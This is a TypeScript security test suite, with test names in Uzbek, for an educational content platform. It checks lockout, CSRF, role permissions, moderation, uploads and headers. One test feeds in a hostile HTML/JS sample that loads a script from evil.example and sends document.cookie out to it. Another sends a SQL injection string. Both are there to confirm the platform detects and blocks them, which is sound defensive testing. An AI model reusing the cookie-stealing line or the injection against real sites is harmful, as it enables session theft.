import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import type { AddressInfo } from 'node:net';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'tf-test-'));
process.env.LOGIN_RATE_MAX = '1000'; process.env.DATA_DIR = tmp; process.env.DB_FILE = path.join(tmp, 'test.db');
let base = ''; let srv: any; const pw = 'Test-Passw0rd-123';

class Client {
  cookie = ''; csrf = '';
  async req(method: string, url: string, body?: unknown, headers: Record<string, string> = {}, raw?: Buffer) {
    const h: Record<string, string> = { ...headers };
    if (this.cookie) h.cookie = this.cookie;
    if (this.csrf && method !== 'GET') h['x-csrf-token'] = this.csrf;
    let payload: any = raw;
    if (body !== undefined) { h['content-type'] = 'application/json'; payload = JSON.stringify(body); }
    const r = await fetch(base + url, { method, headers: h, body: payload });
    const sc = r.headers.get('set-cookie'); if (sc) this.cookie = sc.split(';')[0];
    const text = await r.text(); let json: any = null; try { json = JSON.parse(text); } catch { /* html */ }
    return { status: r.status, json, text, headers: r.headers };
  }
  async login(email: string, password = pw) { const r = await this.req('POST', '/api/auth/login', { email, password }); if (r.status === 200) this.csrf = r.json.me.csrf; return r; }
}

before(async () => {
  const { seed } = await import('../seed.js');
  const { run } = await import('../db.js');
  const { hashPassword } = await import('../auth.js');
  seed({ adminEmail: 'admin@test.local', adminPassword: pw });
  for (const [email, role] of [['teacher@test.local', 'teacher'], ['teacher2@test.local', 'teacher'], ['district@test.local', 'district_moderator'], ['editor@test.local', 'republic_editor']])
    run('INSERT INTO users(email,password_hash,full_name,role_id) VALUES(?,?,?,(SELECT id FROM roles WHERE key=?))', email, hashPassword(pw), role, role);
  const { server } = await import('../index.js');
  await new Promise<void>(r => server.listen(0, '127.0.0.1', () => r()));
  srv = server; base = 'http://127.0.0.1:' + (server.address() as AddressInfo).port;
});
after(() => { srv?.close(); fs.rmSync(tmp, { recursive: true, force: true }); });

test('login: noto‘g‘ri parol rad etiladi, 5 urinishdan keyin hisob bloklanadi', async () => {
  const c = new Client();
  for (let i = 0; i < 5; i++) assert.equal((await c.login('teacher2@test.local', 'wrong-password-1')).status, 401);
  assert.equal((await c.login('teacher2@test.local')).status, 423, 'to‘g‘ri parol ham bloklangan hisobda ishlamasligi kerak');
});

test('CSRF: sessiya bor, lekin token yo‘q — o‘zgartirish rad etiladi', async () => {
  const c = new Client(); await c.login('admin@test.local');
  const bad = await fetch(base + '/api/admin/announcements', { method: 'POST', headers: { cookie: c.cookie, 'content-type': 'application/json' }, body: JSON.stringify({ titleUz: 'x' }) });
  assert.equal(bad.status, 403);
  assert.equal((await c.req('POST', '/api/admin/announcements', { titleUz: 'Test e’lon' })).status, 200);
});

test('RBAC: o‘qituvchi admin va studiya API laridan foydalana olmaydi (backend darajasida)', async () => {
  const t = new Client(); await t.login('teacher@test.local');
  for (const [m, u] of [['GET', '/api/admin/dashboard'], ['GET', '/api/admin/content'], ['GET', '/api/studio/projects'], ['GET', '/api/admin/users'], ['GET', '/api/admin/audit'], ['GET', '/api/admin/export']] as const)
    assert.equal((await t.req(m, u)).status, 403, u);
  assert.equal((await t.req('POST', '/api/admin/content', { kind: 'lesson', translations: { uz: { title: 'x' } } })).status, 403);
  assert.equal((await new Client().req('GET', '/api/admin/dashboard')).status, 401);
});

test('moderatsiya jarayoni: ruxsatsiz o‘tishlar rad etiladi, tegishli rol tasdiqlaydi va nashr qiladi', async () => {
  const d = new Client(); await d.login('district@test.local');
  const created = await d.req('POST', '/api/admin/content', { kind: 'lesson', grade: 5, translations: { uz: { title: 'Tuman moderatori darsi', summary: 's' } } });
  assert.equal(created.status, 200); const id = created.json.id;
  assert.equal((await d.req('POST', `/api/admin/content/${id}/transition`, { to: 'published' })).status, 409, 'draft → published o‘tishi mavjud emas');
  assert.equal((await d.req('POST', `/api/admin/content/${id}/transition`, { to: 'in_review' })).status, 200);
  assert.equal((await d.req('POST', `/api/admin/content/${id}/transition`, { to: 'approved' })).status, 403, 'tuman moderatori tasdiqlay olmaydi');
  const e = new Client(); await e.login('editor@test.local');
  assert.equal((await e.req('POST', `/api/admin/content/${id}/transition`, { to: 'approved' })).status, 200);
  const slug = (await e.req('GET', `/api/admin/content/${id}`)).json.slug;
  assert.equal((await new Client().req('GET', `/api/content/${slug}`)).status, 404, 'nashr qilinmaguncha mehmon ko‘rmaydi');
  assert.equal((await e.req('POST', `/api/admin/content/${id}/transition`, { to: 'published' })).status, 200);
  assert.equal((await new Client().req('GET', `/api/content/${slug}`)).status, 200);
  assert.equal((await e.req('GET', `/api/admin/content/${id}/reviews`)).json.length, 3, 'har bir o‘tish tarixga yozilgan');
});

test('foydalanuvchilar: pastroq rol yuqoriroq rolni yarata olmaydi, zaif parol rad etiladi', async () => {
  const d = new Client(); await d.login('district@test.local');
  assert.equal((await d.req('POST', '/api/admin/users', { email: 'x@test.local', fullName: 'Test User', role: 'super_admin', password: pw })).status, 403);
  const a = new Client(); await a.login('admin@test.local');
  assert.equal((await a.req('POST', '/api/admin/users', { email: 'weak@test.local', fullName: 'Weak Pw', role: 'teacher', password: 'short' })).status, 400);
  assert.equal((await a.req('POST', '/api/admin/users', { email: 'ok@test.local', fullName: 'Ok User', role: 'teacher', password: pw })).status, 200);
});

test('HTML Studio: xavfli kod nashrdan to‘silgan; sandbox va CSP sarlavhalari o‘rnatilgan', async () => {
  const e = new Client(); await e.login('editor@test.local');
  const p = await e.req('POST', '/api/studio/projects', { name: 'Test' }); assert.equal(p.status, 200); const id = p.json.id;
  const evil = { name: 'Test', html: '<script src="https://evil.example/x.js"></script><iframe src="https://evil.example"></iframe><form action="https://evil.example"></form>', css: '', js: 'fetch("https://evil.example?c="+document.cookie)' };
  const saved = await e.req('PUT', `/api/studio/projects/${id}`, evil); assert.equal(saved.status, 200);
  const codes = saved.json.findings.map((f: any) => f.code);
  for (const c of ['external-script', 'embed-tag', 'form-action', 'network', 'cookie']) assert.ok(codes.includes(c), c + ' aniqlanmadi');
  assert.equal((await e.req('POST', `/api/studio/projects/${id}/publish`)).status, 422);
  assert.equal((await new Client().req('GET', `/embed/${id}`)).status, 404, 'nashr qilinmagan loyiha mehmonga ko‘rinmaydi');
  await e.req('PUT', `/api/studio/projects/${id}`, { name: 'Test', html: '<h1 id="t">Salom</h1>', css: 'h1{color:teal}', js: 'document.getElementById("t").textContent="OK"' });
  assert.equal((await e.req('POST', `/api/studio/projects/${id}/publish`)).status, 200);
  const emb = await new Client().req('GET', `/embed/${id}`);
  assert.equal(emb.status, 200);
  const csp = emb.headers.get('content-security-policy') ?? '';
  assert.match(csp, /default-src 'none'/); assert.match(csp, /connect-src 'none'/); assert.match(csp, /sandbox allow-scripts/); assert.doesNotMatch(csp, /allow-same-origin/);
  assert.match(emb.text, /Content-Security-Policy/);
  const t = new Client(); await t.login('teacher@test.local');
  assert.equal((await t.req('GET', `/api/studio/projects/${id}`)).status, 403);
});

test('HTML Studio: boshqa muallifning loyihasi cheklangan', async () => {
  const d = new Client(); await d.login('district@test.local');
  const e = new Client(); await e.login('editor@test.local');
  const p = await e.req('POST', '/api/studio/projects', { name: 'Editor loyihasi' });
  assert.equal((await d.req('GET', `/api/studio/projects/${p.json.id}`)).status, 403);
});

test('media: tur, mazmun va hajm tekshiriladi', async () => {
  const e = new Client(); await e.login('editor@test.local');
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(32)]);
  const ok = await e.req('POST', '/api/admin/media', undefined, { 'content-type': 'image/png', 'x-filename': 'rasm.png' }, png); assert.equal(ok.status, 200);
  const got = await fetch(base + ok.json.url); assert.equal(got.status, 200); assert.equal(got.headers.get('x-content-type-options'), 'nosniff');
  assert.equal((await e.req('POST', '/api/admin/media', undefined, { 'content-type': 'image/png' }, Buffer.from('<html>not a png</html>'))).status, 415);
  assert.equal((await e.req('POST', '/api/admin/media', undefined, { 'content-type': 'text/html' }, Buffer.from('<script>1</script>'))).status, 415);
  assert.equal((await e.req('POST', '/api/admin/media', undefined, { 'content-type': 'image/svg+xml' }, Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'))).status, 415);
  assert.equal((await e.req('POST', '/api/admin/media', undefined, { 'content-type': 'application/pdf' }, Buffer.alloc(11 * 1024 * 1024, 1))).status, 413);
  const t = new Client(); await t.login('teacher@test.local');
  assert.equal((await t.req('POST', '/api/admin/media', undefined, { 'content-type': 'image/png' }, png)).status, 403);
});

test('test: javoblar serverda baholanadi va to‘g‘ri javoblar oldindan oshkor etilmaydi', async () => {
  const c = new Client();
  const q = (await c.req('GET', '/api/assessments/suv-aylanishi-testi?lang=en')).json;
  assert.equal(q.questions.length, 5); assert.ok(!JSON.stringify(q).includes('correct'));
  const wrong = await c.req('POST', '/api/assessments/suv-aylanishi-testi/check', { answers: Object.fromEntries(q.questions.map((x: any) => [x.id, 2])) });
  assert.equal(wrong.status, 200); assert.equal(wrong.json.passed, false);
  const perfect = await c.req('POST', '/api/assessments/suv-aylanishi-testi/check', { answers: Object.fromEntries(q.questions.map((x: any, i: number) => [x.id, i === 3 ? 1 : 0])) });
  assert.equal(perfect.json.percent, 100); assert.equal(perfect.json.passed, true);
});

test('qidiruv, filtrlar va SQL-inyeksiyaga chidamlilik', async () => {
  const c = new Client();
  const r = (await c.req('GET', '/api/content?kind=lesson&subject=fizika')).json; assert.deepEqual(r.items.map((i: any) => i.slug), ['moddalarning-agregat-holatlari']);
  assert.equal((await c.req('GET', '/api/search?q=zzzzqqq')).json.total, 0);
  assert.equal((await c.req('GET', '/api/content?kind=hacker')).status, 400);
  const inj = await c.req('GET', '/api/search?q=%27%20OR%201%3D1%20--'); assert.equal(inj.status, 200); assert.equal(inj.json.total, 0);
});

test('audit jurnali muhim amallarni yozadi, faqat ruxsatli rol o‘qiydi', async () => {
  const a = new Client(); await a.login('admin@test.local');
  const log = (await a.req('GET', '/api/admin/audit')).json;
  const actions = log.items.map((x: any) => x.action);
  for (const need of ['auth.login', 'auth.login_failed', 'studio.publish', 'user.create', 'media.upload']) assert.ok(actions.includes(need), need);
  const d = new Client(); await d.login('district@test.local');
  assert.equal((await d.req('GET', '/api/admin/audit')).status, 403);
});

test('xavfsizlik sarlavhalari va noto‘g‘ri origin', async () => {
  const r = await fetch(base + '/api/bootstrap');
  assert.equal(r.headers.get('x-content-type-options'), 'nosniff'); assert.match(r.headers.get('content-security-policy')!, /script-src 'self'/); assert.match(r.headers.get('content-security-policy')!, /frame-ancestors 'self'/);
  const bad = await fetch(base + '/api/auth/login', { method: 'POST', headers: { 'content-type': 'application/json', origin: 'https://evil.example' }, body: JSON.stringify({ email: 'a@b.co', password: 'x' }) });
  assert.equal(bad.status, 403);
});
